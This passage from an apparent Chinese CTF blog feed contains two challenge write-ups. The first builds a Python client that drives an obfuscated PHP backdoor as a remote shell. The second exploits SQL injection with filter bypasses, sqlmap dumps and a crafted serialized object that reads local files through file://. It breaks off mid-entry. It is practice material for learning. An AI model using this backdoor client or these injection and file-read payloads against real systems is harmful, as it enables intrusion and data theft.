因为后门会在eval()处理完毕后返回输出信息,且输出信息是被加密过的,因此还需要一个解密过程</p> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="string">&quot;xxx&quot;</span>;<span class="comment">#假设这是收到的响应数据</span></span><br><span class="line"><span class="variable">$o1</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="variable">$o2</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$o1</span>,<span class="variable">$k</span>);</span><br><span class="line"><span class="variable">$o3</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><p> 以上就是整个加密构造payload并接收响应数据的流程,思路还是比较简单的</p><p> 现在就需要构造出最终的连接脚本</p></li></ol><h2 id="构造构造连接脚本"><a href="#构造构造连接脚本" class="headerlink" title="构造构造连接脚本"></a>构造构造连接脚本</h2><ol><li><p>因为从referer中提取的payload的殊勋依赖于Accept-Language,而不同的客户端发送的Accept-Language可能不一样,因此这里需要一个函数来辅助生成随机的可选语言及权重值</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于生成随机的 Accept-Language</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># from idlelib.debugger_r import debugging</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.connectionpool <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choicePart</span>(<span class="params">seq, amount</span>):</span><br><span class="line">    <span class="comment"># 获取seq的长度</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="comment"># 如果长度等于零或者长度小于amount的值就打印错误返回空值</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error Input&#x27;</span>)</span><br><span class="line">        <span class="comment"># 返回空值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []  <span class="comment"># 定义结果数组</span></span><br><span class="line">    indexes = []  <span class="comment"># 定义索引数组</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 当count &lt; amount时就</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = random.randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:  <span class="comment"># 如果i不在indexes数组里面</span></span><br><span class="line">            indexes.append(i)  <span class="comment"># 就追加上i</span></span><br><span class="line">            result.append(seq[i])  <span class="comment"># result数组就追加seq的第i位字符</span></span><br><span class="line">            count += <span class="number">1</span>  <span class="comment"># count+一</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:  <span class="comment"># 如果和amount参数值相等</span></span><br><span class="line">                <span class="keyword">return</span> result  <span class="comment"># 就返回值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_bytes_flow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):  <span class="comment"># 这里产生0 - amount 的数字</span></span><br><span class="line">        result += <span class="built_in">chr</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment"># 返回一个随机字符串</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 先判断输入的序列串是否为空,不为空就建立result数组,并循环经序列串中的值添加到result数组中,这里的序列串的是可以是可选语言,也可以是权重值,最后返回result数组</p></li><li><p>因为实际攻击代码的组成为随机填充数据+payload+随机填充数据,并且构造交互式shell也需要随机填充数据,因此这里需要创建函数来生成随机数来填充数据</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_bytes_flow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):  <span class="comment"># 这里产生0 - amount 的数字</span></span><br><span class="line">        result += <span class="built_in">chr</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment"># 返回一个随机字符串</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串(有所有大小写字符组成)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_alpha</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):</span><br><span class="line">        <span class="comment"># choice() 方法返回一个列表,元素或字符串的随机项</span></span><br><span class="line">        <span class="comment"># string.ascii_letters 会生成所有字母</span></span><br><span class="line">        result += random.choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 这里创建了两个函数,分别对应不同的情况</p></li><li><p>循环异或函数</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#模拟x()函数,循环异或加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop_xor</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    len_text = <span class="built_in">len</span>(text)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len_text:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len_text <span class="keyword">and</span> j &lt; len_key:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[j]) ^ <span class="built_in">ord</span>(text[i]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  result</span><br></pre></td></tr></table></figure><p> 代码中x()函数</p></li><li><p>开启debug</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启debug选项</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_Print</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>  这个可开可不开 , 开启 Debug 有助于代码分析 </p></li><li><p>定义基本变量</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义基本变量</span></span><br><span class="line">debugging = <span class="literal">False</span>  <span class="comment"># 默认关闭debug,可用true开启</span></span><br><span class="line">keyh = <span class="string">&quot;42f7&quot;</span>  <span class="comment"># $kh,需要更改</span></span><br><span class="line">keyf = <span class="string">&quot;e9ac&quot;</span>  <span class="comment"># $kf,需要更改</span></span><br><span class="line">xor_key = keyh + keyf  <span class="comment"># $k异或密钥</span></span><br><span class="line">url = <span class="string">&#x27;http://111.200.241.244:61732/hack.php&#x27;</span>  <span class="comment"># 指定url,需要更改</span></span><br><span class="line">defaultlang = <span class="string">&#x27;zh-CH&#x27;</span>  <span class="comment"># 默认Language</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]  <span class="comment"># Accept-Language 模板</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;  <span class="comment"># 代理,可用burpsuite截取</span></span><br><span class="line">sess = requests.Session()  <span class="comment"># 创建一个session对象</span></span><br></pre></td></tr></table></figure></li><li><p>生成完整的Accept-Language和payload两侧填充的随机填充空白</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 每次会话产生一次随机的 Accept-Language</span></span><br><span class="line">lang_tmp = choicePart(languages, <span class="number">3</span>)  <span class="comment"># 这里先输出了一个列表,里面包含模板中的三种Aceept-language</span></span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)  <span class="comment"># 首先返回了一个三个数字的数组并且按照降序进行排序 例如[8,7,2]</span></span><br><span class="line">accept_lang = [defaultlang]  <span class="comment"># 先添加默认langguage</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    accept_lang.append(lang_tmp[i] % (indexes[i]))</span><br><span class="line">accept_lang_str = <span class="string">&#x27;,&#x27;</span>.join(accept_lang)  <span class="comment"># 使用,连接数组中的元素使其反回一个字符串</span></span><br><span class="line"><span class="comment"># accep_lang_str就是要使用的Accept-language</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(accept_lang_str)</span></span><br><span class="line">init2Char = accept_lang[<span class="number">0</span>][<span class="number">0</span>] + accept_lang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i 这里的就是数组中的 字符串 所以是二维数组</span></span><br><span class="line">md5 = md5()</span><br><span class="line">md5.update((init2Char + keyh).encode())</span><br><span class="line">md5head = (md5.hexdigest())[<span class="number">0</span>:<span class="number">3</span>]  <span class="comment"># 这块首先进行连接在返回md5值,再返回16进制的数据字符串值 在进行截取前三位</span></span><br><span class="line">md5.update((init2Char + keyf).encode())</span><br><span class="line">md5tail = (md5.hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + rand_alpha(random.randint(<span class="number">3</span>, <span class="number">8</span>))  <span class="comment"># $f + 填充字符串 在进行连接随机数量的填充字符</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>构造payload<strong>这里有点问题在python3 中没有找到合适的函数进行解密</strong></p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line"><span class="comment"># 交互式shell</span></span><br><span class="line">cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span>  <span class="comment"># 其中input函数是从命令行获取标准输入并返回字符串</span></span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># 在写入payload前填充一些无关数据</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + random.randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = rand_alpha(random.randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(</span><br><span class="line">            (rand_bytes_flow(random.randint(<span class="number">3</span>, <span class="number">12</span>))).encode()).decode()  <span class="comment"># 转换为适合url传输的base64格式</span></span><br><span class="line">        query.append((key, value))</span><br><span class="line">    <span class="comment"># 对payload进行加密</span></span><br><span class="line">    payload = (zlib.compress(<span class="string">&#x27;cmd&#x27;</span>.encode())).decode(<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"> <span class="comment"># 使用zlib.compress进行压缩操作 就是compress操作而这里的cmd是字符串而非bytes类型所以使用嗯code进行编码</span></span><br><span class="line">    payload = loop_xor(payload, xor_key)  <span class="comment"># 进行循环异或运算,相当于PHP代码中的x函数</span></span><br><span class="line">    payload = base64.urlsafe_b64encode(payload.encode()).decode()  <span class="comment"># 进行url的base64编码</span></span><br><span class="line">    payload = md5head + <span class="built_in">str</span>(payload)</span><br><span class="line">   <span class="comment"># print(payload)# 在开头补全$h 而这里的payload 是bytes类型所以转换成str</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对payload进行修改1</span></span><br><span class="line">    cut_index = random.randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payload_pieces = (payload[<span class="number">0</span>:cut_index], payload[cut_index:], md5tail)</span><br><span class="line">    i_piece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payload_pieces[i_piece])</span><br><span class="line">        i_piece += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 将payload作为查询字符串编码拼接到referer中</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.parse.urlencode(query)</span><br></pre></td></tr></table></figure><p> 这里的代码用于构造payload,包括添加payload两侧的随机填充数据,payload本身的加密,最终把加密混淆后的payload作为参数值传输到referer中</p></li><li><p>发送请求数据,并接收处理响应数据</p><p> 攻击代码写好了,下面仅需要发送请求并接收数据,解密后即可查看到攻击者的命令执行结果</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;Accept-Language&#x27;</span>: accept_lang_str</span><br><span class="line">        , <span class="string">&#x27;Referer&#x27;</span>: referer</span><br><span class="line">               &#125;</span><br><span class="line">    req = sess.get(url, headers=headers, proxies=proxies)</span><br><span class="line">    <span class="comment">#print(req.text)</span></span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="comment"># 接收响应数据包</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xor_key, xor_key))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="comment">#print(output)</span></span><br><span class="line">    <span class="comment"># 如果没有响应包,则对其进行处理</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error, no backdoor response&#x27;</span>)</span><br><span class="line">        cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 如果收到响应数据包,则对其进行处理</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    output = output.encode(<span class="string">&#x27;base64&#x27;</span>)  <span class="comment"># base64_decode解码</span></span><br><span class="line">    output = loop_xor(output, xor_key)  <span class="comment"># 循环异或运算</span></span><br><span class="line">    output = zlib.decompress(output.encode())  <span class="comment"># geuncompress 运算</span></span><br><span class="line">    <span class="built_in">print</span>(output)  <span class="comment"># 输出响应信息</span></span><br><span class="line">    cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p> 连接脚本获得数据</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208904.png" alt="1646569346034"></p></li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208908.png" alt="1646569355167"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界fakebook</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfakebook/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfakebook/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界fakebook"><a href="#攻防世界fakebook" class="headerlink" title="攻防世界fakebook"></a>攻防世界fakebook</h1><p>打开网页有login 与join界面login弱口令登录试试,登录使用sqlmap跑一下看有无注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt --level 4  --dbs --batch</span><br></pre></td></tr></table></figure><p>查看一下源码,在扫描一下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101038987.png" alt="image-20220310103853926"></p><p>发现这些挨个访问看看在robots.txt页面发现有</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure><p>上面的文件虽然存在但是却无法访问到,有可能是因为权限不够,需要找系统中访问的其他方式</p><p>接下来下载下来user.php.bak得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;    </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)    </span>&#123;     </span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;      </span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;        </span><br><span class="line"><span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;    &#125;   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)    </span>&#123;        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">//初始化一个url回话        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的url        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置url参数,要求结果保存到字符串还是输出到屏幕    </span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//运行curl,请求网页     </span></span><br><span class="line"><span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="comment">//获取一个curl连接资源句柄的信息      </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;        </span><br><span class="line"><span class="keyword">return</span> <span class="number">404</span>;        &#125;        </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">//关闭一个curl会话     </span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$output</span>;    &#125;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)    </span>&#123;     </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable language_">$this</span>-&gt;blog);    &#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)    </span>&#123;    </span><br><span class="line"><span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;      </span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>访问 view.php发现报错信息,得到绝对路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/view.php </span><br></pre></td></tr></table></figure><p>这里对join 注册页面进行抓包使用sqlmap抓包看看有无注入发现有一个注入点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -dbs --batch//这里得到数据库名</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] fakebook</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook --tables --batch   //这里得到表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook -T users --dump --batch//这里得到字段</span><br><span class="line">-----------------------------------------------------------------+</span><br><span class="line">| no   | data | passwd    | username                                                 ---------------------------------------------+</span><br><span class="line">| 1    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin   |</span><br><span class="line">| 2    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:100:&quot;admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB&quot;;s:3:&quot;age&quot;;i:4;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注册完成登录进去之后会发现只有一个username可以点击可以发现其在访问页面,在url中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1</span><br></pre></td></tr></table></figure><p>尝试一下sql注入发现报错信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101042353.png" alt="image-20220310104235297"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=1#正常</span><br><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=2#错误</span><br></pre></td></tr></table></figure><p>可以发现有注入点,这里发现字段数为4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view.php?no=1 order by 3#错误</span><br><span class="line">view.php?no=1 order by 4#正常</span><br><span class="line">view.php?no=1 order by 5#错误</span><br></pre></td></tr></table></figure><p>在这里发现网页有对sql注入语句的过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union select 1,2,3,4#</span><br></pre></td></tr></table></figure><p>这里经过fuzz发现单个的字符并未进行过滤而是过滤的union select整个语句所以这里使用注释符&#x2F;**&#x2F;进行绕过,或者++进行绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union++select 1,2,3,4</span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101043115.png" alt="image-20220310104318999"></p><p>这里发现2字段可以使用这里直接使用load_file()函数获取系统文件要求,权限较高,且要求文件的绝对路径,这里并没有</p><p>这里继续注入一下其他内容看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">//获得用户名</span><br><span class="line">root@localhost </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">//获得数据库名</span><br><span class="line">fakebook </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#</span><br><span class="line">//获取fakebook中的表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,group_concat(data,username,passwd),3,4 from users where no=1#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名为data,username,passwd的值</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;a1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 </span><br></pre></td></tr></table></figure><p>这里的序列化对象便与之前的获得到的user.php.bak 进行了对应 这里便是进行反序列化了class UserInfo{}类</p><p>最开始时的用户页面no&#x3D;1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no&#x3D;1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101045078.png" alt="image-20220310104526968"></p><p>注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的）</p><p>因此这里需要构造blog参数的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>原因是在源码中有blog的base64编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;10em&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,&#x27;</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>这里利用了File协议读取本地文件,使用PHP构造出payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>接着进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 